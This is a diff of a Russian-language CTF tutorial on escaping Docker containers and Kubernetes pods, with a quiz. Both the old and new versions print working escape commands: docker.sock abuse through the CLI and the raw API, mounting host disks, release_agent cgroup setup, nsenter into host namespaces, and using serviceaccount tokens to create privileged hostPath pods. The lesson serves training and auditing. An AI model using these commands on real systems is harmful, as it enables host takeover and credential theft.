@@ -14,242 +14,200 @@ useful_for:
 estimated_minutes: 30
 summary: "Практический побег из Docker-контейнера и Kubernetes-пода: docker.sock, privileged, монтирования хоста, cgroup release_agent, nsenter и проверка изоляции."
 ---
-## Почему контейнер — не граница безопасности
 
-Контейнер (Docker, containerd, Kubernetes pod) — это не виртуальная машина, а набор **namespaces** и **cgroups** поверх общего ядра. Если контейнер запущен с лишними привилегиями, общим `docker.sock`, смонтированной файловой системой хоста или уязвимым ядром — из него можно «сбежать» и получить доступ к хосту или другим контейнерам. В CTF такие задачи в misc, в реальности — при аудите CI/CD, облаков и Kubernetes.
+## Вопрос, с которого всё начинается
 
-Ментальная модель: побег возможен, когда контейнер **пересекается** с хостом (общий namespace, привилегии, смонтированные пути, доступ к сокету). Задача — найти это пересечение.
+Тебе дали шелл в CTF-задаче: ты внутри контейнера, флаг лежит на хосте. Контейнер — не виртуальная машина, а набор **namespaces** (изолированных «миров»: PID, сеть, монтирования) и **cgroups** (ограничений ресурсов) поверх общего ядра. Пока изоляция полная — ты заперт. Но если контейнер где-то **пересекается** с хостом, из него можно «сбежать». Вся задача — найти это пересечение.
 
-## Разведка контейнера
+Разберём побег шаг за шагом.
 
-Первым делом определите, где вы и что доступно.
+## Наш пример: мы внутри контейнера
 
-```bash
-cat /proc/1/cgroup                 # docker/k8s/kubepods?
-ls -la /.dockerenv 2>/dev/null     # признак Docker
-cat /proc/self/status | grep Cap   # capabilities
-capsh --print 2>/dev/null
-ls /proc/self/ns/                  # какие namespaces
-cat /proc/self/mountinfo           # смонтировано с хоста
-env | grep -iE 'kube|docker|token|secret'
-hostname; cat /etc/hostname
-```
-
-Признаки Kubernetes:
+Первое правило — не гадать, а посмотреть, где мы. Собираем признаки:
 
 ```bash
-ls /var/run/secrets/kubernetes.io/serviceaccount/   # token, ca.crt, namespace
-cat /var/run/secrets/kubernetes.io/serviceaccount/token
+$ cat /proc/1/cgroup
+0::/
+$ ls -la /.dockerenv
+-rwxr-xr-x 1 root root 0 /.dockerenv
+$ cat /proc/self/status | grep -E 'Cap(Eff|Bnd)'
+CapEff: 0000000000000000
+CapBnd: 000001ffffffffff
 ```
 
-## Вектор 1: docker.sock
+Файл `/.dockerenv` есть почти в каждом Docker-контейнере, а `cgroup` без пути `kubepods` говорит, что это, скорее всего, Docker, а не Kubernetes. `CapEff` (эффективные capabilities — «права») нулевые: пока мы не привилегированы. Дальше ищем мосты к хосту.
 
-Если смонтирован `/var/run/docker.sock`, вы управляете Docker-демоном хоста.
+## Шаг 1: ищем «пересечения» с хостом
 
-```bash
-ls -la /var/run/docker.sock
-# запустить привилегированный контейнер с монтированием хоста
-docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
-# либо через curl API
-curl --unix-socket /var/run/docker.sock http://localhost/version
-curl --unix-socket /var/run/docker.sock -X POST \
-  http://localhost/containers/create?name=pwn \
-  -H "Content-Type: application/json" \
-  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'
-```
-
-Через сокет вы создаёте контейнер с `-v /:/host` и читаете файловую систему хоста — это полноценный побег.
-
-## Вектор 2: privileged и capabilities
-
-```bash
-cat /proc/self/status | grep CapEff   # напр. 0000003fffffffff = все capabilities
-```
-
-С `CAP_SYS_ADMIN` и привилегированным режимом монтируйте хост-устройства:
-
-```bash
-# найти диск хоста
-fdisk -l
-mkdir /mnt/host && mount /dev/sda1 /mnt/host
-chroot /mnt/host sh
-```
-
-Без монтирования, но с `CAP_SYS_ADMIN` + `CAP_SYS_CHROOT`:
-
-```bash
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
-mkdir /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
-echo "/tmp/cgrp/release_agent" > /tmp/cgrp/x/release_agent
-# (CVE-2022-0492 / release_agent трюк)
-```
-
-## Вектор 3: монтирование хоста
-
-Если какой-то путь хоста смонтирован в контейнер (часто `/host`, `/proc`, `/sys`, `/var/run`), ищите запись в `/proc/self/mountinfo`. Через `/proc/1/root` иногда доступна ФС хоста. Если смонтирован `cgroup` или `hostPath` — используйте release_agent/планировщик.
-
-## Вектор 4: nsenter и host PID
-
-При `--pid=host` (или доступе к host PID namespace) заходите в namespace хоста:
-
-```bash
-nsenter --target 1 --mount --uts --ipc --net --pid -- sh
-```
-
-Если `nsenter` нет — через `/proc/1/ns/`:
-
-```bash
-ls -la /proc/1/ns/
-nsenter -t 1 -m -u -i -n -p -- /bin/sh
-```
-
-## Вектор 5: Kubernetes
-
-- **Service account token:** `/var/run/secrets/kubernetes.io/serviceaccount/token` → `kubectl --token=... --server=https://kubernetes.default` → проверьте права (`kubectl auth can-i --list`).
-- **kubelet 10250:** доступ к pod'ам, иногда exec.
-- **hostPath pod:** если есть право создавать pod'ы с `hostPath: /` — монтируйте корень и читайте.
-- **privileged pod:** аналогично Docker privileged.
-- **etcd 2379:** без аутентификации — дамп секретов кластера.
-
-```bash
-kubectl auth can-i --list
-kubectl get pods --all-namespaces
-kubectl create -f evil-pod.yaml   # privileged + hostPath /
-```
-
-## Разобранный пример: побег через docker.sock
+Побег возможен там, где контейнер делит что-то с хостом. Проверяем четыре места:
 
 ```bash
 $ ls -la /var/run/docker.sock
 srw-rw---- 1 root docker 0 ... /var/run/docker.sock
+$ grep -E '/host|/proc|/sys|/var/run' /proc/self/mountinfo | head -3
+... /var/run/docker.sock ...
+$ ls -la /proc/1/ns/
+lrwxrwxrwx ... pid -> pid:[4026531836]
+```
+
+Есть **docker.sock** — UNIX-сокет, через который клиент `docker` общается с демоном. Если он смонтирован в контейнер, мы можем управлять демоном хоста. Это и есть пересечение.
+
+## Шаг 2: docker.sock — полный контроль над хостом
+
+Docker-демон на хосте запускает контейнеры **от root**. Значит, кто говорит с сокетом — тот фактически root. Проверяем:
+
+```bash
 $ docker -H unix:///var/run/docker.sock ps
-CONTAINER ID   IMAGE     ...   NAMES
-a1b2c3         target    ...   victim
+CONTAINER ID   IMAGE    ...   NAMES
+a1b2c3d4e5f6   target   ...   victim
+```
+
+Демон отвечает — доступ есть. Теперь создаём свой контейнер с монтированием корня хоста в `/host` и читаем флаг:
+
+```bash
 $ docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine \
     chroot /host cat /root/flag.txt
 FLAG{docker_sock_is_root}
 ```
 
-Сокет дал полный контроль над хостом — классический побег.
-
-## Справочная таблица: векторы побега
-
-| Вектор | Признак | Команда |
-|--------|---------|---------|
-| docker.sock | файл сокета | `docker -H unix://... run -v /:/host` |
-| privileged | CapEff полный | `mount /dev/sda1` |
-| CAP_SYS_ADMIN | CapEff | mount cgroup/host |
-| host mount | mountinfo | доступ к `/host` |
-| host PID | `--pid=host` | `nsenter -t 1 -a` |
-| k8s token | serviceaccount | `kubectl auth can-i` |
-| kubelet | :10250 | exec в pod |
-| etcd | :2379 | дамп секретов |
-
-## Типовые ошибки новичка
-
-- **Искать «эксплойт ядра» сразу.** Чаще всего побег — через конфигурацию (сокет/привилегии), а не CVE.
-- **Не проверить capabilities.** `CapEff` сразу показывает, привилегирован ли контейнер.
-- **Забыть про Kubernetes.** Token в `serviceaccount` — прямой путь к API.
-- **Игнорировать mountinfo.** Смонтированные пути — самый частый «мост» к хосту.
-- **Путать namespaces.** Проверьте, какие из них общие с хостом.
-
-## Что дальше / решение
-
-Порядок: разведка (`cgroup`, `CapEff`, `mountinfo`, env) → определить вектор (сокет/привилегии/mount/PID/k8s) → выполнить побег → прочитать флаг/данные. Связанные уроки: `misc-sandbox`, `misc-sandbox-containers`, `cloud-*` (K8s-специфика). Решение — когда получен доступ к хосту/другому контейнеру или прочитан флаг.
-
-## Расширенный разбор: как читать конфигурацию контейнера
-
-Быстрый скрипт-триаж, который показывает все «пересечения» с хостом:
+Если клиента `docker` в контейнере нет — работаем напрямую через API:
 
 ```bash
-#!/bin/sh
-echo "== cgroup =="; cat /proc/1/cgroup
-echo "== docker? =="; ls -la /.dockerenv 2>/dev/null
-echo "== caps =="; grep Cap /proc/self/status; capsh --print 2>/dev/null | head
-echo "== mounts (host) =="; grep -E "/host|/proc|/sys|/var/run" /proc/self/mountinfo | head
-echo "== sock =="; ls -la /var/run/docker.sock 2>/dev/null
-echo "== k8s token =="; ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
-echo "== namespaces =="; ls -la /proc/1/ns/ 2>/dev/null
+$ curl --unix-socket /var/run/docker.sock http://localhost/version
+{"Version":"24.0.7",...}
+$ curl --unix-socket /var/run/docker.sock -X POST \
+    'http://localhost/containers/create?name=pwn' \
+    -H 'Content-Type: application/json' \
+    -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'
 ```
 
-Читайте результат так: `CapEff` полный (`0000003fffffffff`) → почти наверняка привилегированный; смонтированный `/host` или `docker.sock` → прямой побег; наличие `serviceaccount/token` → вы в pod'е Kubernetes. Каждый из этих признаков — отдельный вектор. Даже один смонтированный «лишний» путь часто достаточен.
+Сокет — самый частый и самый «дешёвый» вектор побега в CTF.
 
-## Практический чек-лист
+## Шаг 3: privileged и capabilities
 
-1. Определить платформу (Docker/K8s/containerd) по `cgroup`/`/.dockerenv`.
-2. Проверить capabilities (`CapEff`), `privileged`.
-3. Проверить `docker.sock` и другие сокеты.
-4. Проверить `mountinfo` на смонтированные пути хоста.
-5. Проверить host PID namespace (`nsenter`).
-6. Проверить `serviceaccount` token и права в K8s.
-7. Выбрать вектор, выполнить побег, зафиксировать доступ.
+Если сокета нет, смотрим права. **Capabilities** — это раздробленные root-привилегии: `CAP_SYS_ADMIN` (монтирование, cgroup, доступ к `/proc`), `CAP_NET_RAW`, `CAP_SYS_PTRACE` и другие. Полный набор выглядит так:
 
-## Справочная таблица: инструменты и команды
+```bash
+$ cat /proc/self/status | grep CapEff
+CapEff: 0000003fffffffff
+$ capsh --print
+Current: cap_sys_admin,cap_sys_ptrace,cap_net_raw,...
+```
 
-| Задача | Команда |
-|--------|---------|
-| Платформа | `cat /proc/1/cgroup`, `ls /.dockerenv` |
-| Capabilities | `grep Cap /proc/self/status`, `capsh --print` |
-| Сокет Docker | `docker -H unix:///var/run/docker.sock ps` |
-| Монтирования | `cat /proc/self/mountinfo` |
-| Host PID | `nsenter -t 1 -a` |
-| K8s права | `kubectl auth can-i --list` |
-| K8s pods | `kubectl get pods -A` |
-| Монтирование хоста | `mount /dev/sda1 /mnt` |
+`0000003fffffffff` — почти все capability, то есть контейнер привилегированный. Тогда монтируем диск хоста:
 
-## Вектор 6: уязвимости ядра и runc (обзор)
+```bash
+$ fdisk -l
+Disk /dev/sda: 40 GiB ...
+$ mkdir /mnt/host && mount /dev/sda1 /mnt/host
+$ chroot /mnt/host sh
+```
 
-Иногда конфигурация «чистая», но ядро или рантайм уязвимы. Известные классы: побег через `runc` (CVE-2019-5736 — перезапись бинарника `runc` при `exec`), через ядерные уязвимости (`Dirty Pipe` CVE-2022-0847, `Dirty COW` CVE-2016-5195), через `overlayfs` (CVE-2023-0386). Признаки: необычная версия ядра (`uname -a`), старый Docker/containerd, возможность запускать контейнеры. Проверьте `uname -r` и сравните с известными CVE; при наличии публичного эксплойта под вашу версию — применяйте. Помните: это крайний случай, сначала исчерпайте конфигурационные векторы (сокет, привилегии, монтирования) — они надёжнее и безопаснее для стабильности системы. В CTF ядерные побеги дают редко, чаще задача решается через `docker.sock` или `privileged`.
+Без монтирования, но с `CAP_SYS_ADMIN`, работает трюк с **release_agent**: cgroup при «опустошении» запускает скрипт на хосте, и мы указываем туда свой путь (CVE-2022-0492 — тот же класс).
+
+## Шаг 4: смонтированный hostPath и nsenter
+
+Иногда корень хоста смонтирован в контейнер явно (часто в `/host`). Смотрим `/proc/self/mountinfo` и идём туда. Отдельный вектор — общий **PID namespace** (`--pid=host`): тогда мы видим процессы хоста и заходим в их окружение через `nsenter`:
+
+```bash
+$ ls -la /proc/1/ns/
+lrwxrwxrwx ... mnt -> mnt:[4026531832]
+$ nsenter --target 1 --mount --uts --ipc --net --pid -- sh
+```
+
+`nsenter` входит в namespaces процесса с PID 1 — если это процесс хоста, мы оказываемся на хосте. Если `nsenter` в контейнере нет, те же namespaces доступны через `/proc/1/ns/`.
+
+## Шаг 5: Kubernetes — serviceaccount token
+
+Если `cgroup` содержит `kubepods`, мы в поде Kubernetes. У пода есть **service account** — учётная запись для доступа к API кластера, а её токен лежит в файле:
+
+```bash
+$ ls /var/run/secrets/kubernetes.io/serviceaccount/
+ca.crt  namespace  token
+$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+$ kubectl --token=$TOKEN --server=https://kubernetes.default --insecure-skip-tls-verify auth can-i --list
+```
+
+Дальше смотрим, что разрешено. Если можно создавать поды с `hostPath: /` или `privileged: true` — монтируем корень узла и читаем всё:
+
+```bash
+$ kubectl get pods --all-namespaces
+$ kubectl create -f evil-pod.yaml     # privileged + hostPath /
+```
+
+Соседние векторы в кластере: kubelet на порту `10250` (иногда даёт exec в поды) и etcd на `2379` без аутентификации (дамп секретов).
+
+## Шаг 6: ядерные уязвимости — крайний случай
+
+Иногда конфигурация чистая, но уязвимо ядро или рантайм: перезапись бинарника `runc` при `exec` (CVE-2019-5736), `Dirty Pipe` (CVE-2022-0847), `overlayfs` (CVE-2023-0386). Признак — необычная версия (`uname -r`) и старый Docker/containerd. Это **крайний случай**: сначала исчерпай конфигурационные векторы (сокет, привилегии, монтирования) — они надёжнее и не роняют систему.
+
+## Что мы теперь знаем
+
+- Контейнер — это **namespaces + cgroups**, а не отдельное ядро; побег ищет пересечение с хостом.
+- **docker.sock** даёт управление демоном хоста — это полноценный root.
+- **`CapEff`** показывает привилегии; `CAP_SYS_ADMIN` открывает монтирование и cgroup.
+- **Смонтированный hostPath** и общий **PID namespace** (`nsenter`) — прямые мосты на хост.
+- В Kubernetes **serviceaccount token** даёт доступ к API; `hostPath`/`privileged` поды — побег.
+- **Ядерные CVE** — крайний случай, а не первый выбор.
+
+## На что смотреть дальше
+
+Порядок разведки: `cgroup` → `/.dockerenv` → `CapEff`/`capsh` → `mountinfo` → сокеты → `serviceaccount`. Каждый найденный признак — отдельный вектор. Дальше читай `misc-seccomp-escape` (фильтры syscall), `misc-namespace-escape` (namespaces/cgroups) и `cloud-*` про Kubernetes. В реальном аудите цель — не флаг, а понимание, **почему** контейнер получил лишнее пересечение (забытый `-v /var/run/docker.sock`, `privileged: true` в манифесте). Полезно завести привычку: как только получаешь шелл в контейнере, первым делом прогоняй скрипт-триаж из урока и сохраняй вывод — по нему видно, какой вектор доступен, без слепых попыток.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Почему доступ к /var/run/docker.sock равен побегу?"
+- question: "Почему доступ к /var/run/docker.sock фактически равен побегу?"
   options:
-    - "это просто лог"
+    - "это просто лог-файл"
     - "через сокет можно управлять демоном и запускать контейнеры с монтированием хоста"
-    - "это файл SSH"
+    - "это файл с SSH-ключами"
     - "это шрифт"
   answer: 1
   explanation: "Docker-демон запускает контейнеры от root хоста."
-- question: "Какая capability позволяет монтировать и использовать nsenter?"
+- question: "Какая capability открывает монтирование и работу с cgroup?"
   options:
     - "CAP_NET_RAW"
     - "CAP_SYS_ADMIN"
     - "CAP_CHOWN"
     - "CAP_SETUID"
   answer: 1
-  explanation: "CAP_SYS_ADMIN открывает монтирование, cgroup и доступ к /proc."
+  explanation: "CAP_SYS_ADMIN — самая мощная capability в контексте побега."
 - question: "Что делает release_agent в cgroup?"
   options:
-    - "освобождает память"
+    - "освобождает память процесса"
     - "запускает скрипт на хосте при опустошении cgroup"
     - "удаляет контейнер"
     - "шифрует диск"
   answer: 1
-  explanation: "Это известный вектор побега при CAP_SYS_ADMIN."
-- question: "Зачем читать token из /var/run/secrets в поде Kubernetes?"
+  explanation: "Известный вектор побега при наличии CAP_SYS_ADMIN."
+- question: "Зачем в поде Kubernetes читают serviceaccount token?"
   options:
-    - "для красоты"
-    - "чтобы обращаться к K8s API с правами service account"
-    - "для ускорения"
-    - "для сжатия логов"
+    - "для красоты отчёта"
+    - "чтобы обращаться к API кластера с правами service account"
+    - "чтобы ускорить сеть"
+    - "чтобы сжать логи"
   answer: 1
   explanation: "Токен аутентифицирует вас в API-сервере кластера."
-- question: "Первый шаг при побеге из контейнера?"
+- question: "С чего начинается побег из контейнера?"
   options:
     - "сразу mount /dev/sda"
-    - "определить платформу, capabilities, namespaces и монтирования"
-    - "удалить контейнер"
-    - "перезагрузить хост"
+    - "с разведки: платформа, capabilities, namespaces, монтирования"
+    - "с удаления контейнера"
+    - "с перезагрузки хоста"
   answer: 1
   explanation: "От разведки зависит выбор рабочего вектора."
 ```
 
+## Куда дальше
+
+В следующем уроке `misc-seccomp-escape` мы разберём другой слой изоляции — **seccomp**: фильтр системных вызовов, который запрещает `execve` и заставляет писать ORW-шеллкод. А пока главное запомни: **контейнер безопасен ровно настолько, насколько полно он изолирован** — ищи то, что он делит с хостом.
+
 ## Где пригодится
 
-- **CTF Misc** — задачи на побег из контейнера.
+- **CTF misc** — задачи на побег из контейнера.
 - **Пентест** — аудит изоляции Docker/Kubernetes.
 - **Cloud security** — побег из подов EKS/GKE/AKS.
 - **Работа/SOC** — понимание признаков компрометации контейнера.
